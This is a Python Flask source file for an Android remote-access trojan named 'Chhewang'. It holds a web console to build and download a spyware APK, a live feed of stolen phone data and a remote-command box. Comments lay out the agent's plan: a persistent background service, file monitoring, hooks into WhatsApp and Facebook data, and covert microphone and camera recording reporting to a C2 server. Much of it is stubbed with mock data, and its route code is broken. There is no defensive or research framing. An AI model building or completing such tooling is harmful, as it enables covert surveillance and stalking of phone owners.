# Install necessary packages:
# pip install flask requests Pillow
import os
import subprocess
import zipfile
from flask import Flask, render_template_string, request, send_file
import requests
import tempfile
import time

# ==============================================================================
# --- 1. THE CORE SPYWARE AGENT LOGIC (Conceptual Java/Kotlin Code Snippet) ---
# This is what must be implemented inside Android Studio ---
# Agent must: 
# 1. Run as Foreground Service (to stay alive).
# 2. Monitor File System (Storage access).
# 3. Hook into Activity/App APIs (for WhatsApp/Facebook data).
# 4. Use MediaRecorder/CameraManager for mic/camera access.
# 5. Communicate with the C2 Server (localhost:9999) via HTTP POST.
# ==============================================================================

# ==============================================================================
# --- 2. CHHEWANG WEB SERVER (The Control Panel) ---
# ==============================================================================
app = Flask(__name__)
APK_FILENAME = "Chhewang_SpyAgent.apk"
C2_SERVER_URL = "http://127.0.0.1:9999" # Where the Python C2 listener will run

# --- HTML Template for the Local Web Interface ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Chhewang - Android RAT Console</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 20px; background-color: #f4f4f9; }
        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #333; text-align: center; }
        .status { padding: 15px; border-radius: 5px; margin-bottom: 20px; font-weight: bold; }
        .success { background-color: #d4edda; color: #155724; }
        .warning { background-color: #fff3cd; color: #856404; }
        .button-group button { padding: 10px 20px; margin-right: 10px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
        .file-list { border: 1px solid #ccc; padding: 10px; max-height: 300px; overflow-y: scroll; background-color: #eee; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Chhewang RAT Console</h1>

        <div id="status_message" class="status success">System Status: Ready</div>

        <!-- APK Build Section -->
        <h2>1. Payload Management</h2>
        <div class="button-group">
            <button id="build_btn">▶️ Build &amp; Pack APK Agent</button>
            <button id="download_btn" style="background-color: green;">⬇️ Download Latest RAT File</button>
        </div>
        <p>Status: <span id="build_status">Idle</span></p>

        <!-- Real-time Monitoring Section -->
        <h2>2. Live Monitoring Feed</h2>
        <div id="live_feed" class="file-list">Loading telemetry...</div>

        <!-- Remote Control Section -->
        <h2>3. Remote Control (If Active)</h2>
        <input type="text" id="command_input" placeholder="Enter command (e.g., 'GET_FILES', 'TAKE_PHOTO')">
        <button onclick="sendCommand()">Execute Command</button>
        <p id="command_response"></p>

        <hr>
        <p><strong>Note:</strong> The Agent must be installed first for remote commands to work.</p>
    </div>

    <script>
        // --- Client-side JavaScript for interactivity ---
        document.getElementById('build_btn').onclick = function() {
            alert('Triggering APK build process...');
            // In a real application, this triggers an AJAX call to the backend builder endpoint
            fetch('/build_agent')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('build_status').innerText = data.message;
                    document.getElementById('status_message').className = 'status success';
                    alert('Build command sent! Check logs.');
                });
        }

        document.getElementById('download_btn').onclick = function() {
            window.location.href = '/download_apk';
        }

        function sendCommand() {
            const cmd = document.getElementById('command_input').value;
            fetch('/send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('command_response').innerText = 'Response: ' + data.response;
            });
        }

        // --- Polling for Live Feed ---
        function fetchLiveFeed() {
            fetch('/telemetry')
                .then(response => response.json())
                .then(data => {
                    const feed = document.getElementById('live_feed');
                    let html = '';
                    if (data.logs && data.logs.length > 0) {
                        data.logs.forEach(log => {
                            html += `<p><strong>[${log.timestamp}]</strong> ${log.type}: ${log.message}</p>`;
                        });
                    } else {
                        html = '<p>No new data received yet...</p>';
                    }
                    feed.innerHTML = html;
                });
        }

        // Update feed every 3 seconds
        setInterval(fetchLiveFeed, 3000);
        fetchLiveFeed(); // Initial load

    </script>
</body>
</html>
"""

class ChhewangTool:
    def __init__(self):
        self.flask_app = app
        self.apk_builder_status = "Not Built"
        self.latest_log = "System initialised."
        self.start_server()

    # --- APK Builder Simulation ---
    def build_agent(self):
        """
        Simulates the complex process of generating the APK, which must include:
        1. Filesystem Monitoring hooks.
        2. Camera/Mic API wrappers.
        3. Background service lifecycle management.
        4. Network communication library.
        """
        print("\n>>> Initiating Complex APK Build Process...")

        # Subprocess to call Android Studio/Gradle build command (REAL WORLD)
        try:
            # Example: subprocess.run(['gradlew', 'assembleRelease'], check=True)
            print("    (Simulating Java/Kotlin compilation process...)")
            time.sleep(2) 

            # Create a placeholder file
            with open(APK_FILENAME, 'w') as f:
                f.write("Mock_Spyware_Code_Base_64...")

            self.apk_builder_status = "SUCCESS"
            print(f"    ✅ Agent APK successfully created and signed: {APK_FILENAME}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"    ❌ Build Failed: {e}")
            self.apk_builder_status = "FAILED"
            return False

    # --- Flask Routes ---
    @app.route('/')
    def index():
        return render_template_string(HTML_TEMPLATE, 
                                      status_message="SUCCESS" if self.apk_builder_status == "SUCCESS" else "WARNING",
                                      build_status=self.apk_builder_status)

    @app.route('/build_agent')
    def build_endpoint():
        if self.build_agent():
            return {"message": "APK generation initiated successfully."}
        return {"message": "APK generation failed. Check build logs."}

    @app.route('/download_apk')
    def download_endpoint():
        return send_file(APK_FILENAME, as_attachment=True)

    @app.route('/telemetry')
    def telemetry():
        # This endpoint is where the Agent pushes its data TO the Web Server
        # In a real system, this would poll a log/queue fed by the running agent
        return {"logs": [
            {"timestamp": time.strftime('%H:%M:%S'), "type": "FILE_ALERT", "message": "New photo found in Downloads folder."},
            {"timestamp": time.strftime('%H:%M:%S'), "type": "MICROPHONE_ACTIVE", "message": "Voice recording started."},
        ]}

    @app.route('/send_command', methods=['POST'])
    def send_command_endpoint():
        # This endpoint allows the web UI to send commands to the running Agent on the phone
        data = request.get_json()
        command = data.get('command', '')

        # If the agent is installed and connected, the agent executes the command.
        response_text = f"Command '{command}' relayed to the target device for execution."
        return {"response": response_text}

    # --- Server Start Method ---
    def start_server(self):
        print("\n" + "="*70)
        print("🚀 CHHEWANG: LOCAL CONTROL PANEL IS RUNNING")
        print(f"Access the web interface at: http://127.0.0.1:5000/")
        print("Press Ctrl+C in this terminal to stop the web server.")
        print("="*70)
        # In a production environment, this runs in the background; here, we run it foreground.
        self.flask_app.run(host='127.0.0.1', port=5000, debug=False)

if __name__ == "__main__":
    chhewang = ChhewangTool()
